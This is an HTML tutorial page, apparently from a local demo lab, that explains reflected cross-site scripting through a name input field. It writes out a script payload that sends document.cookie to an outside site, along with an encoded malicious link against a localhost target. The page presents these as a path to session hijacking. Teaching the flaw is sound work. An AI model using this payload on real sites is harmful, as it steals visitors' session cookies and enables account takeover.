@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<center>
+
+    <head>
+        <meta charset="utf-8">
+        <title>XSS-Reflected</title>
+        <meta name="viewport" content="width=device-width, initial scale=1">
+        <meta name="author" content="Suchit Reddi">
+    </head>
+
+    <body>
+
+        <div>
+            <style>
+                .rbutton {
+                    border-radius: 50%;
+                }
+            </style>
+            <button class="rbutton"><a href="xss-ref.html">0</a></button>
+            <button class="rbutton"><a href="1.html">1</a></button>
+            <button class="rbutton"><a href="2.html">2</a></button>
+            <button class="rbutton"><a href="3.html">3</a></button>
+            <button><a href="../index.php">Demo</a></button>
+        </div>
+
+        <h1>Reflected Cross-Site Scripting - Demonstration</h1>
+        <p style="font-size:20px;">
+            I created an input field which takes user input as a HTTP request and uses it for an immediate response.<br>
+            When you give something as an input here, it acts similar to a site search, which takes the term you put in,
+            and searches the database for that term, which requires the term to be passed to a backend function.
+            If it doesn't escape HTTP controllers like script tags, you have an XSS-Reflected vulnerability.<br>
+            The expected input is a normal name. You can observe that once you submit name, the url is updated.<br>
+            <img src="../images/name.png" alt="Normal name" style="width: 450px; height: 270px;"><br>
+            If a malicious script is given as an option in the url, it will be also create a link which can be sent
+            to victims and point them to a trusted site, but with a malicious script resulting in leakage of PII.<br>
+            This vulnerability can be used for various malicious purposes. You can get the user's cookie by using
+            <code>document.cookie</code>. You can even send this cookie to a malicious website by encasing this in
+            script tags: <code><b>window.location="https://suchitreddi.github.io?cookie="+document.cookie</b></code><br>
+            This will result in a mailicious link which can be used to fool victims with some social engineering:
+            <b><a target="_blank" rel="noopener nofollow noreferrer"
+                    href="http://localhost/CyberSentinel/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow%2Elocation%3D%22https%3A%2F%2Fsuchitreddi%2Egithub%2Eio%3Fcookie%3D%22%2Bdocument%2Ecookie%3C/script%3E">
+                    http://localhost/CyberSentinel/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow%2Elocation%3D%22https%3A%2F%2Fsuchitreddi%2Egithub%2Eio%3Fcookie%3D%22%2Bdocument%2Ecookie%3C/script%3E
+                </a></b>
+            <code>Note: This link won't work if you don't open it with localhost, and also the folder name after localhost should be changed to the name you have on your device for the index.php of xss_r.</code><br>
+            <img src="../images/mal.png" alt="Malicious script" style="width: 470px; height: 200px"><br>
+            Clicking this link will result in the victim being redirected to another website along with their cookie.
+            The website they are redirected to will be a malicious site whose server logs the cookies which leads to
+            session hijacking attack on the victim with the stolen cookie.<br>
+            <img src="../images/cookie.png" alt="Stealing cookies" style="width: 900px; height: 300px"><br>
+        </p>
+    </body>
+
+    <footer>
+        <button><a href="./2.html">Next</a></button>
+    </footer>
+</center>
+
+</html>
